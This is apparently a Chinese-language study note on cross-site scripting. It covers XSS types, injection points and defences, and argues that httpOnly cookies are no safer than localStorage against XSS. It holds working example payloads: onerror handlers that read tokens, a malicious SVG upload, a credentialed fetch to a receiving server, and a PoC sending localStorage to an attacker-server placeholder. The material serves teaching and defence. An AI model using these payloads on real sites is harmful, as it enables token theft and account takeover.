# XSS: 跨站脚本攻击
全称是 Cross-site scripting 

<br><br>

## XSS产生的原因: 
程序对输入和输出的控制不够严格, 导致 "精心构造" 的脚本输入后 在输到前端时 被浏览器当做有效的代码解析从而执行 产生危害

比如:  
我们可以在任意网站 在form表单中输入如下的代码 可以测试有没有 XSS 漏洞 如果有 则下面的代码则会执行

**执行过程是:**    
该方式是反射型 该代码会提交到服务器 然后由服务器返回 浏览器误解析执行恶意代码 才执行的
```s
'"><script>alert(22)</script>
```

上面的代码没有任何的危害性 但如果如上的代码是收集用户的
- cookie信息
- 密码信息
- 键盘操作信息

<br>

**原因:**  
在网站页面上没有对 **输入的信息** 进行 **严格控制** 导致了可以加载恶意代码从而对客户端用户造成威胁
 
<br><br>

## XSS侧重点:
它侧重于脚本 千方百计的注入并执行恶意脚本

<br><br>

### XSS攻击危害:
- 窃取 cookie
- 劫持流量
- 插入广告
- 置入木马
- 获取用户信息

- url参数注入 *
- 输入框注入 *

主要是利用 **url参数注入** & **输入框注入** 的方法 也就是说一切用户可以输入的地方都是XSS的用武之地, 所以一切用户的输入都是不安全的

<br>

- 一般在各类的社交平台 邮件系统 开源流行的web应用 造成的杀伤力十分强大

- 劫持用户的 cookie 信息 是最常见的跨站攻击形式  
通过在网页中写入并执行脚本文件 劫持用户的浏览器 将用户当前使用的 sessionId 信息发送至攻击者控制的网站或服务器中 

- 框架钓鱼 利用 js 脚本的基本功能之一 操作网页中的DOM树结构和内容 在网页中通过 js 脚本 生成虚假页面欺骗用户执行操作 而用户所有的输入内容都会被发送到攻击者的服务器上

- 木马
- 有局限性的键盘记录

<br>

### XSS攻击分类:

**反射型:**  
浏览器提交恶意代码到服务器 然后由服务器将恶意代码传回客户端, 前端浏览器将恶意代码当做有效代码解析并执行, **服务器返回代码中包含恶意代码**

**反射型恶意代码的过程:**  
恶意代码会由客户端到服务端 然后再由服务端返回客户端  
攻击过程必须让用户访问指定的url才能生效 并且访问过程产生的数据 不会对服务端和数据库产生影响

我们将 恶意的代码 注入到 url 上

<br>

**存储型:**  
浏览器提交恶意代码到服务器 然后服务器将恶意代码存到数据库, 存储型给用户带来的危害是最大的 因为它是最持久的

比如网页中的留言板的信息 就会永久的保存到数据里 会对访问网站响应页面的所有用户造成影响

<br>

**DOM型:**   
恶意代码没有提交到服务器 它仅在客户端运行, **服务器返回的代码是正常的**

**DOM型恶意代码的过程:**   
恶意代码会一直存储在客户端

**举例:**  
比如搜索引擎 当我们输入关键字的时候 会生成一个页面 页面中保存 含有关键字的各种连接 DOM型也是 我们在文本框内输入 恶意代码 会创建出来一个 指向攻击者的超链接

或者 当我们输入 恶意代码 后 会操作DOM树 生成一个假的网页 钓鱼

<br>

### 反射型 & DOM型 的注入方式:
通过 **url查询字符串参数的方式** 进行注入, 也就是说引诱用户点击我精心准备带有恶意代码的链接 
```s
http://xxx?kid="<script>恶意代码</script>"
```

<br>

**举例:**  
下面的案例是 前端页面有 input 我们会输出字符 后台开始进行匹配 显示对应的结构

下面 if else 判断中 将我们的输入分为两类
- 有信息
  - 输入的是 kobe
  - 其它信息

- 没信息

我们的逻辑判断主要是关注有没有输入信息 或者 关注的是特定的信息

但是没有对输入信息 做限制 比如不能输入什么信息 所以当我们写入 恶意的代码信息, 就会被浏览器解析

```php
if(isset($_GET["submit"])) {
  // 文本框为空情况
  if(empty($_GET["message"])) {
    $html.="<p>输入 kobe 试试</p>"

    // 文本框不为空
  } else {
    if($_GET["message"] == "kobe") {
      Shtml.="愿你和{$_GET["message"]}一样年轻"
    } else {

      // 恶意代码可能会在这里被浏览器解析
      Shtml.="who is {$_GET["message"]} i dont care"
    }
  }
}
```

<br>

### 存储型 的注入方式:
在输入框输入恶意代码 然后点击提交 就会提交到服务端 服务端会将恶意代码存储到数据库 以后用户每次访问 都会拉取到恶意代码并执行 所以给用户带来的危害是最持久的

<br><br>

## XSS脚本存在的地方
只要是变量的地方 就可以拼接 恶意代码

- 标签体
- 标签属性
- style样式值
- url & src & href
- onclick onerror onfocus等标签事件

<br>

### 标签体
脚本在 html 代码包含响应的 xss 漏洞代码信息
```html
<p>{{untrusted data}}</p>
```

<br>

### 标签属性
```html
<img src="image.png" alt = "{{untrusted data}}">
```

<br>

### URL中
```html
<a href="{{untrusted data}}"> link </a>
```

<br>

### Style中
```html
<img style="{{untrusted data}}">
```

<br><br>

## 预防 XSS 攻击
XSS的攻击过程是先注入再执行 所以我们要

- 防止注入
- 防止执行

<br>

所以要对用户的输入和输出做严格的把控, 所以

- <font coloe="#C2185B">对输入进行过滤</font>
- <font coloe="#C2185B">对输出进行转义</font>

- 服务器对输入脚本进行过滤或转码
- 前端对输入进行转码或者限制输入
- cookie使用httponly属性
- 添加验证码防止脚本冒充用户提交危险操作
- csp
  1. 限制加载其他域下的资源文件 这样即使黑客插入了一个js文件 这个文件也是无法被加载的
  2. 禁止向第三方域提交数据 这样用户数据也不会外泄
  3. 禁止执行内联脚本和未授权脚本
  4. 还得提供上报机制 这样可以帮助我们尽快发现有哪些xss攻击 以便修复

<br>

### 预防方案:

**校验:**  
对所有可输入的地方进行校验 比如我们收集的是邮箱 那么就看看是不是邮箱的格式

```html
用户名: <script>这就要校验</script>
```

<br>

**过滤:**  
主要是对 script 和 iframe 等特殊的标签 以及过滤掉 onclick onerror onfocus 等特殊的js事件属性

<br>

**编码转义:**  
对要渲染的内容进行编码转义 防止他们执行

```js
// 对 < > & 等字符进行了转义
function SaferHTML(templateData) {
  let s = '';
  for (let arg of templateData) {
    s += arg.replace(/&/g, "&amp;")
            .replace(/</g, "&lt;")
            .replace(/>/g, "&gt;");
    }
  return s;
}
```

<br>

**限制:**  
限制输入的长度:  
因为恶意代码一般比较长 限制输入长度会增加攻击难度

<br>

**httpOnly:**  
cookie设置成 httponly   
因为我们一般会采集用户的cookie 设置该属性后会增加攻击难度

<br><br>

## XSS攻击原理:

### 利用原有网站的 url 地址获取用户数据信息

**用户正常访问网站的过程:**  
```
(正常的)            (正常的)
客户端用户          服务端网站
```

1. 用户向服务器请求登录页面
2. 用户输入登录信息
3. 服务器校验 校验成功 则登录成功

<br>

**XSS的访问过程:**  

```
(正常的)            (正常的)
客户端用户          服务端网站


          黑客用户
```

1. 黑客用户 请求服务器 请求登录页面

2. 黑客用户在登录页面利用xss漏洞 加载js恶意代码, 恶意代码的逻辑是将用户的用户名和密码发送到 黑客的服务器, 黑客会将这个 有问题的 url 通过某种手段 发送给用户

3. 用户在有恶意代码的登录页面 开始登录 将登录信息发送给黑客平台 自动页面跳转首页(为了迷惑用户)

4. 黑客平台拿到用户的登录信息后 将自己的http请求报文内容 替换为 用户的信息

<br>

### 利用自己网站的 url 地址获取用户数据信息
1. 黑客搭建自己的网站 发送公众号中
2. 用户访问黑客的网站, 黑客网站会采集用户的cookie信息(比如用户访问过的jd taobao的cookie)
3. 在黑客的平台获取用户的cookie信息 
4. 黑客利用用户的cookie的信息 假冒用户访问正规网站

<br><br>

# 为什么 localStorage 容易遭受 XSS 攻击
XSS是将一段恶意脚本添加到网页上, 通过浏览器加载而执行从而达到攻击并获得隐私信息的目的  

LocalStorage 和 SessionStorage 在这一点上都容易受到XSS攻击  攻击者可直接向本地存储对象添加恶意脚本并执行  因此不太建议把一些敏感的个人信息存储在Web Storage中

- 用户名密码
- 信用卡资料
- JsonWeb令牌
- API密钥
- SessionID

<br>

## 如何避免攻击？
1. 尽量不要用同一域名部署多个Web应用程序, 如果有这种场景请尽量使用子域名部署应用, 因为一旦多应用使用统一的域名, 这将会对所有的用户共享Web存储对象  

2. 一旦将数据存储在LocalStorage中, 开发人员在用户将其清除之前无法对其进行任何控制  如果希望在会话结束后自动删除数据, 请使用SessionStorage  

3. 从WebStorage读取出的数据都要验证、编码和转义  

4. 在保存进WebStorage前将数据加密  


<br><br>

# XSS案例1:

## 背景描述:
我和我的朋友ethicalbughunter正在一个私人程序上打猎 这个程序有一个导入功能, 我们可以上传 .csv 或 .docx 这样的文件, 当我们点击那个导入功能从桌面上选择文件时, 它显示 "所有支持的类型", 所以我们把桌面上的 "所有支持的类型 "改为 "所有文件", 然后上传了一个扩展名为 .svg 的文件, 该文件包含xml脚本中的XSS有效载荷

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0.0,50.50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
prompt('XSS-Attack');
prompt(document.domain);
prompt(document.cookie);
prompt(alert(localStorage.getItem("token")));
</script>
</svg>
```

起初, 文件被简单地上传, 但什么也没有发生, 我们无法找到文件被上传的路径  所以我们又重复了同样的步骤, 这次我们拦截了文件上传请求的响应, 在那里我们能够找到路径  我们访问了该路径并发现了一个存储的XSS 在查看了认证流程后, 我们注意到, 每次登录都会生成一个认证令牌, 而且对每个账户都是唯一的 该令牌被存储在LocalStorage中, 该令牌也保护网站免受CSRF攻击  

**现在的问题是, 我们应该如何从Localstorage中窃取令牌？**  

因为如果我们设法做到这一点, 我们可能会制作不同的其他攻击  因此, 在我们的.svg文件中, 我们添加了一行从localstorage窃取令牌的提示(alert(localStorage.getItem("token")); 并上传了文件  当我们访问该路径时, 我们成功地从localstorage窃取了令牌  

<br><br>

## 发生 token 被窃取的原因
在我看来, 它的发生有三个原因

1. 在上传文件时, 没有检查扩展名
2. 文件上传后, 没有进行Content-Type验证
3. 在文件被发送到服务器后, 服务器没有对其进行验证

攻击者可以窃取任何用户的认证令牌, 并可以制作不同的攻击, 如csrf、会话攻击、账户接管等 其影响取决于在localStorage中存储了什么样的信息  

<br>

### 应对方案
- 网站应允许不可执行的扩展
- 内容类型验证
- 服务器端检查

可以减轻这类问题  

<br><br>

# XSS案例2:

如果你浏览互联网, 你会发现很多开发者在传播这样的信息：localStorage是不安全的, 你不应该用它来存储认证令牌

相反, 你应该使用http-only cookies来保存这些令牌  

在属于这篇文章的代码和视频中, 你可以详细看到如何在一个有漏洞的页面上发动XSS攻击 请看一下这个简短的代码片段  
```js
const contentWithUserInput = `
  <img src="${userPickedImageUrl}">
  <p>${someUserInput}</p>
`

outputElement.innerHTML = contentWithUserInput
```

这段代码有什么问题？

我们直接设置了某个outputElement的innerHTML(这可以是对我们页面上某个DOM元素的简单引用)  

如果someUserInput包含JavaScript代码, 这可能会导致问题  

```js
// highlight-next-line
const someUserInput = '<script>alert("Hacked!")</script>'

const contentWithUserInput = `
  <img src="${userPickedImageUrl}">
  <p>${someUserInput}</p>
`

outputElement.innerHTML = contentWithUserInput
```

说实话, 大多数浏览器都应该捕捉到这一点, 而且你确实不应该收到 "黑客 "警报 但接下来的代码片段将导致问题  


### 加载图片的时候 使用了 onerror
```js
const userPickedImageUrl =
  'https://some-invalid-url.com/no-image!jpg" onerror="alert("Hacked")"'

const contentWithUserInput = `
  <img src="${userPickedImageUrl}">
  <p>${someUserInput}</p>
`

outputElement.innerHTML = contentWithUserInput
```

这有什么问题呢？

我们最终只是建立了一个字符串, 存储在contentWithUserInput中  而用上面的代码, js代码会嵌套在dom结构中

```html
<img
  src="https://some-invalid-url.com/no-image!jpg"
  onerror="alert('Hacked')"
/>
<p>Some message...</p>
```

在注入的代码中, 我们故意尝试加载一个不存在的图像, 然后依次导致onerror代码执行  

onerror是``<img>``元素的有效HTML属性, 因此一切将正常运行  

如果用户输入(在本例中是从userPickedImageUrl接收的)没有转义, 那么XSS攻击就是这样发起的  

<br>

### 利用XSS攻击从本地存储中窃取数据

```js
// highlight-next-line
const userPickedImageUrl =
  'https://some-invalid-url.com/no-image!jpg" onerror="const token = localStorage.getItem("token")'

const contentWithUserInput = `
  <img src="${userPickedImageUrl}">
`

outputElement.innerHTML = contentWithUserInput
```

使用上面描述的XSS漏洞, 很容易窃取令牌和/或需要该令牌的任何其他数据  

在上面这个片段中, 我们在注入的代码中检索到了令牌, 然后我们可以把它发送到我们自己的服务器(即攻击者的服务器)或做任何我们想做的事情  

顺便说一下, 如果你认为我们在这里只偷了令牌 但如果是存储型的xss则会将这段代码存储到数据库 那么其他用户访问该页面的话 就会导致更严重的问题

如果你存储了这种未经过滤的输入, 这种注入的XSS JavaScript代码可以在成千上万的机器上为成千上万的用户运行  所有这些令牌(也就是这些用户的数据)都将面临风险  

<br>

### 存储token真的是 cookie 要比 localStorage 还要安全么?

你经常读到, 当涉及到存储认证令牌或类似数据时, cookies比localStorage更好 

仅仅是因为cookies不容易受到XSS攻击  

**这是不正确的!**

<br>

如果我们使用cookie, 我们可以发起和上面一样的攻击, 下面是我们如何在cookie的帮助下获取一个令牌+存储它  

<br>

### 将后台返回的token保存在cookie
```js
// 请求函数 向地址发起请求 参数是 邮箱和密码 然后我们将返回的token设置到了 cookie中
async function authenticate(email, password) {
  const response = await fetch('https://my-backend.com/login', {
    method: 'POST',
    body: JSON.stringify({ email, password }),
  })

  const data = await response.json()

  document.cookie = 'token=' + data.token
}
```

上面的代码会拿到token并将其保存在cookie的token的key中

<br>

### 从 cookie 中取出token 放到请求头中 发起请求
当我们需要 token的时候 可以从 cookie中取出, 比如再次发起请求的时候 我们可以加入到 请求头中 用做验证

```js
async function getUserInfo() {
  // highlight-start
  const token = document.cookie
    .split('; ')
    .find((c) => c.startsWith('token'))
    .split('=')[1]
  // highlight-end
  const response = await fetch('https://my-backend.com/user-data', {
    headers: {
      Authorization: 'Bearer ' + token,
    },
  })
  // handle response + response data thereafter
}
```

<br>

### XSS窃取token
下面是我们如何用XSS攻击窃取令牌的代码  

我们还是利用了 img onerror 在图片错误的情况下 通过js代码获取token

```js
// highlight-start
const userPickedImageUrl =
  'https://some-invalid-url.com/no-image!jpg" onerror="const token = document.cookie.split("; ").find(c => c.startsWith("token")).split("=")[1]'
// highlight-end

const contentWithUserInput = `
  <img src="${userPickedImageUrl}">
`

outputElement.innerHTML = contentWithUserInput

```

<br> 

# 使用http专用的Cookies
上面的情况 我们可以设置 httpOnly 设置后则不能通过客户端的JavaScript设置或读取cookie


设置 http-only 的话 只能在服务器端操作

<br>

### nodejs 设置 http-only
```js
app.post('/authenticate-cookie', (req, res) => {
  // 设置 token 并设置 httpOnly
  res.cookie('token', 'abc', { httpOnly: true })
  res.json({ message: 'Token cookie set!' })
})
```

这就把令牌设置在一个http专用的cookie上, 然后发回给客户端  

浏览器将能够读取和使用该cookie, 但我们的浏览器端JavaScript代码不能读取和设置cookie

这样做的话 token设置在了cookie中, 当我们再次发送请求的时候 请求头字段中不用再带上token了 因为 cookie中有 而且是自发的

```js
async function authenticate(email, password) {
  const response = await fetch('https://my-backend.com/authenticate-cookie', {
    method: 'POST',
    body: JSON.stringify({ email, password }),
  })
}
```

这就足够了, 因为token是cookie的一部分, 它被包含在响应中  

因此, 每当我们需要向受保护的资源发送一个请求时, 请求看起来就像这样  

```js
async function getUserInfo() {
  const response = await fetch('https://my-backend.com/user-data')
  // handle response + response data thereafter
}
```

<br>

**为什么会这样呢？**

因为http-only cookies会自动附加到发出的请求中--浏览器会处理这个问题  

- 如果请求的目标域与服务于前端的域相同, 它们就会自动附加
- 如果是不同的域--也就是说, 如果你有一个跨源请求(例如, 前端服务于my-page.com, 后端服务于my-backend.com), 你需要调整一下客户端的代码  

<br>

### **跨域**请求的时候 需要设置 credentials: 'include'
```js
// 
async function getUserInfo() {
  const response = await fetch('https://my-backend.com/user-data', {
    // highlight-next-line
    credentials: 'include',
  })
  // handle response + response data thereafter
}
```

credentials是一个选项, 你可以在fetch()中设置, **将所有的cookies附加到发出的请求中**  

credentials的默认设置是同源的, 对于跨源请求, 你需要include作为一个值  

<br>

### 后台代码要如下进行配置
后台服务器需要做适当的准备--它需要在发回的响应中设置正确的 CORS 头信息  

```js
app.use((req, res, next) => {
  // 向 前端指定的源进行开放
  res.setHeader('Access-Control-Allow-Origin', 'https://my-page.com/')
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST')
  res.setHeader('Access-Control-Allow-Credentials', true)
  next()
})

```

这些标头授予my-page.com "权利", 使其能够向后端服务器发送带有凭证的GET和POST请求   有了这样的设置, 一切都正常了, 我们正在使用纯http的cookies  

<br>

现在让我们来探讨一下为什么这比localStorage好得不是一星半点

<br><br>

## http-only Cookies and XSS
我们不能用客户端的JavaScript代码读取或写入http-only cookies  因此, 我们必须对XSS进行安全防护, 对吗？

那么, 这段代码呢？

### 利用 img error 发送fetch请求的时候 携带了 credentials: "include"
```js
// highlight-start
const userPickedImageUrl =
  'https://some-invalid-url.com/no-image!jpg" onerror="fetch("https://localhost:8000/", { credentials: "include" })'
// highlight-end

const contentWithUserInput = `
  <img src="${userPickedImageUrl}">
`

outputElement.innerHTML = contentWithUserInput
```

<br>

这段代码将通过XSS注入的代码向localhost:8000发送请求 由于credentials: "include"的问题 发送请求的时候 会携带所有的 cookie

也包括http专用的cookie

<br>

我们所需要的是一个后端服务器, 它可以是这样的  

```js
const express = require('express')
const app = express()

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', 'https://localhost:3000')
  res.setHeader('Access-Control-Allow-Methods', 'GET')
  res.setHeader('Access-Control-Allow-Credentials', true)
  next()
})

app.get('/', (req, res) => {
  token = req.headers.cookie
    .split('; ')
    .find((c) => c.startsWith('token'))
    .split('=')[1]
  res.json({ message: 'Got ya!' })
})
app.listen(8000)
```

<br>

这个非常简单的服务器设置了正确的CORS头, 暴露了一个通往/的GET路由, 并从传入的cookie中读取令牌  

就这样了! 在这里, 你的http-only cookie是相当没有价值的 

<br>

当然你可以说它比localStorage令牌更难检索, 但最终它是相当简单的代码, 可以用来获取令牌  而且你可能不应该依赖潜在的攻击者不知道这种模式  

<br><br>

# SameSite如何？
你可能读了这篇文章后会想 好吧, 我们得到了 SameSite cookie属性  这应该有帮助  

只是为了澄清--这就是SameSite属性可以被添加的方式  

```
SameSite=Strict
```

<br>

### SameSite有三种可能的值: 

None(是默认值):  
对任何网站的请求都会附加Cookies

Lax(是大多数浏览器的默认值):  
允许在顶级导航中发送 Cookies, 并将与第三方网站发起的GET请求一起发送  

Strict:  
Cookies只与针对同一网站的请求一起发送 听起来像是一个解决方案, 对吗？

<br>

**注意:**  
好吧, 首先要明白的是, Internet Explorer不支持SameSite属性! 而且即使在2020+, 你也可能无法忽略所有这些用户  

<br>

此外, Lax默认值只在一些浏览器中设置, 但例如它不是Safari的默认值--在那里, None是默认值  

你可以查一下整个浏览器的支持表, 了解更多信息  

但当然, 你可以**阻止使用IE浏览器的用户**--这是否真的是一个选项, 虽然取决于你的网站--2020年你仍然有大约6%的用户使用IE  

尽管如此, 你也不会百分之百地保存  是的, 将cookie发送到另一个域将不起作用  

<br>


### 问题只存在于本地主机上

在同一个网站上的攻击呢？

如果我访问了你的页面(通过XSS), 我仍然可以利用它代表你的用户在你的网站上做一些事情--例如, 我可以发起一些购买或做其他类似的坏事  

请记住, 窃取授权令牌可能不是攻击者的主要任务  毕竟, 这是关于与登录的用户做事情 - 为此, 我不一定需要你的令牌  我可以在你在页面上的时候为你做一些事情(通过注入的JavaScript)  

因此, 虽然你可以避免cookie/令牌被盗, 但你不能保护你的用户  

但这里有一个重要的说明：这种情况只发生在使用localhost时, 因为localhost:3000和localhost:8000在技术上是同一个域  

**如果你有不同的域--在现实中会是这种情况, 这种攻击模式是不可能的  所以这是一个胜利!**

但是：这最终也救不了你  

**是的, 令牌/cookie不能被发送到不同的域**  

但说实话, 攻击者实际上并不真正需要它  

就像上面写的, 如果我通过XSS进入你的页面, 我并不关心实际的令牌  我可以简单地以你的名义开始购物(或任何已登录的用户可以在网站上做的事情)  

```js
// highlight-start
const userPickedImageUrl =
  'https://some-invalid-url.com/no-image!jpg" onerror="fetch("https://localhost:3000/buy-product?prodid=abc", { credentials: "include", method: "POST" })'
// highlight-end

const contentWithUserInput = `
  <img src="${userPickedImageUrl}">
`

outputElement.innerHTML = contentWithUserInput
```

由于用户已经登录并在cookie中存储了有效的token, 该cookie将被添加到请求中, 因为它是在同一个网站上  

这是一个问题--你无能为力  即使没有 "窃取 "授权令牌, 你也会受到攻击, 攻击者可以代表你的登录用户做一些事情  

<br><br>

## 实际的解决方案

因此, 如果所有的存储机制都是不安全的--那么你应该使用哪一种？

这完全取决于你!

我个人非常喜欢localStorage, 因为它很容易使用   
最关键的是, 你要防止XSS - 那么你就不会有问题, 无论你使用哪种方法  

你的页面不能受到XSS的攻击   
是的, 这是一个微不足道, 甚至有点愚蠢的说法, 但这是事实  

如果你的页面容易受到XSS的攻击, 你就会有问题  而只用http的cookies是无法拯救你的  

<br>

## 我们用默认配置来进行总结：

### localStorage / sessionStorage

默认情况下, Web了浏览器容器几乎是相同的  关闭浏览器之后, localStorage将保持不变, sessionStorage仅持续到浏览器关闭之前  因此, 只能在客户端读取到, 而不能在服务器端读取到, 而且只能通过JavaScript读取到  

<br>

### Cookie

我们的目的是要让发送的信息在服务器端读取和验证  如果配置了正确的保护机制, 恶意JavaScript将很难读取到这些数据  

**传统Cookie保护**

一般来说, 攻击者会通过XSS漏洞来攻击身份认证Cookie, 然后尝试劫持目标的管理员会话, 并最终通过攻击包含漏洞的Web服务器打开进入目标网络系统的"大门", 

我们可以为存储在Cookie容器中的数据设置Header参数, 除了解决底层XSS问题之外, 有HttpOnly、secure、path和domain等标志可以提供不同级别的安全保护 然后再将JWT存储在localStorage中......这就像将密码存储在文本文件中一样  

<br>

### 如何通过XSS漏洞窃取localStorage中的JWT: 暴力破解的方式

在近期的一次研究中, 我发现了一个存储型XSS漏洞, 而目标应用程序正好使用了JWT来作为身份验证机制的实现  Payload设置成功后, 任何访问了该Web页面的用户其JWT都会被发送给攻击者  

一开始, 我无法通过XSS来获取JWT  主要是因为每个JWT都存储有唯一的标识符/键, 所以在不知道这些信息的情况下是无法调用它的  比如说, 在JavaScript警告框中显示标准Cookie(无保护机制)的典型方法如下：

```html
<script>alert(document.cookie)</script>

```

因为localStorage中的数据会存储在一个数组中, 它无法通过类似方法来调用或读取：

```html
<script>alert(localStorage)</script>
```

但是, 我们可以通过使用getItem()函数来获取存储在localStorage或sessionStorage中的每一个对象：

```html
<script>alert(localStorage.getItem(‘key’))</script>


<script>alert(localStorage.getItem(‘ServiceProvider.kdciaasdkfaeanfaegfpe23.username@company.com.accessToken’))</script>
```

<br>

如上图所示, 我们还需要弄清楚"key"这个唯一标识符是什么：

我猜有的人可能已经想用暴力破解的方式了吧, 或者写一个JavaScript脚本来迭代localStorage中的每一个对象  这里我们可以使用JSON.Stringify来实现, 这个函数可以将localStorage中存储的内容转换为字符串并绕过这种障碍：

下面给出的是利用XSS窃取JWT的完整PoC：

```html
<img src=’https://<attacker-server>/yikes?jwt=’+JSON.stringify(localStorage);’--!>

```

根据不同目标系统的实现机制, 上述的PoC可能会给我们提供IdToken、accessToken或其他相关的令牌  IdToken可以用于身份验证并伪装成有问题的用户, 其本质上是帐户接管, 而accessToken可用身份验证端点来生成一个的全新IdToken  

这里最大的问题就在于, 我们无法将传统的Cookie安全标志应用到localStorage中存储的项  

<br>

### 缓解方案
1. 永远不要在localStorage中存储任何敏感信息, 比如说JWT或其他关键的凭据信息  localStorage的目的是通过保存网站状态和设置来为用户提供更好的体验度  

2. 可以考虑使用Cookie头  

3. 设置Cookie头保护机制  

4. 永远不要在页面、URL以及其他源代码中显示令牌  

<br>

无论你把Auth Token放在localStorage还是放在cookie中, 都容易受到XSS风险的影响(在同一个域内......)  

<br>

### tokenを保存する場所

- localStorage
- cookie
- cookie (http only)
- メモリ内 (変数)

人们常说, JWT令牌不应该放在localStorage中 原因是它们很容易被Javascript读取, 所以如果有XSS, 一个非预期的脚本将被触发, 结果是令牌被盗 为一种对策, 许多地方都推荐使用cookies(http only)  


**但是、cookie (http only)も実は無意味**

<br>


## localStorage vs Cookies for Auth Token Storage - 为什么httpOnly Cookies不是更好？

如果有XSS, 脚本无论如何都会被移动   '但是cookie(只有http)不能被脚本读取, 所以这并不重要！' 

但是, 如果攻击者创建了自己的服务器, 并在fetch中设置凭证："include", 他就可以把所有东西都发送到攻击者的服务器上, 包括仅有的http cookies  


**が、同ドメインな場合のみである**

<br>

Cookie不提供按端口隔离的功能  如果一个cookie可以被读取, 则该cookie也可被运行在同一服务器另一端口的

在同一服务器的另一个端口上运行的服务也可以读取  如果一个cookie是可写的服务, 该cookie也可被运行在同一服务器另一端口的在同一台服务器的另一个端口上运行的服务也可以写  

由于这个原因 服务器不应同时在同一主机的不同端口上运行相互不信任的服务  

在同一主机的不同端口上运行相互不信任的服务, 并使用cookie来存储安全敏感信息  

<br>

在这个youtube案例中, 所有的cookie看起来都是用凭证："include "泄露的, 因为它们在本地主机域中使用了3000和8000端口  

如果从a.domain到b.domain使用了凭证："include", 那么a.domain的cookies就不会泄漏到b.domain  

目前, Youtube上的帖子也没有列入名单, 不会出现在搜索中  

<br><br>

# CSRF: 跨站请求伪造
全称 Cross-site request forgery 

<br><br>

## CSRF侧重点:
不注入恶意脚本 侧重于请求伪造 借刀杀人, 在用户不知情的情况下, 借助用户的名义干坏事

<br><br>
